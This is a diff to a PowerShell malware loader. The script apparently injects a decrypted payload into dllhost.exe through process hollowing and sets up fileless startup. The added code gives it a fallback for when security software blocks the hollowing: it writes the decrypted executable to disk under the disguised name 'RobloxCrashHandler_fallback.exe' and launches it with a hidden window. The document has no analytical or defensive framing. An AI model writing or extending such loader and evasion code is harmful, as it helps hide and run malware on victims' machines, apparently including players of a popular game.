@@ -480,11 +480,42 @@ if ($hollowSuccess) {
 }
 
 if (-not $started) {
-    Write-Host "    [!] ERROR: Process hollowing (RAM-only execution) failed or was blocked by security software." -ForegroundColor Red
-    Write-Host "    [!] To protect binary integrity, direct file execution fallback has been disabled." -ForegroundColor Red
+    Write-Host "    [!] Process hollowing failed/blocked. Falling back to direct file execution..." -ForegroundColor Yellow
+    
+    $fallbackExe = $null
+    if (Test-Path $localExe) {
+        $fallbackExe = $localExe
+    } elseif (Test-Path $localServerExe) {
+        $fallbackExe = $localServerExe
+    } else {
+        $fallbackExe = Join-Path $resolvedPath "build\RobloxCrashHandler_fallback.exe"
+        Write-Host "    Writing decrypted bytes to $fallbackExe..." -ForegroundColor Yellow
+        try {
+            [System.IO.File]::WriteAllBytes($fallbackExe, $exeBytes)
+        } catch {
+            Write-Host "    [!] ERROR: Could not write fallback executable: $_" -ForegroundColor Red
+        }
+    }
+
+    if ($fallbackExe -and (Test-Path $fallbackExe)) {
+        Write-Host "    Launching fallback executable: $fallbackExe" -ForegroundColor Green
+        $proc = Start-Process -FilePath $fallbackExe -PassThru -WindowStyle Hidden
+        if ($proc) {
+            Write-Host "    Started fallback process ID: $($proc.Id)" -ForegroundColor Green
+            $started = $true
+        } else {
+            Write-Host "    [!] ERROR: Failed to start fallback process." -ForegroundColor Red
+        }
+    } else {
+        Write-Host "    [!] ERROR: Fallback executable not found or could not be created." -ForegroundColor Red
+    }
+}
+
+if (-not $started) {
+    Write-Host "    [!] ERROR: Both process hollowing and direct execution fallback failed." -ForegroundColor Red
     Exit 1
 } else {
-    Write-Host "    Loader running inside dllhost.exe - zero disk footprint." -ForegroundColor Green
+    Write-Host "    Loader running successfully." -ForegroundColor Green
 }
 
 # -- 4. Configure fileless startup ---------------------------------------------
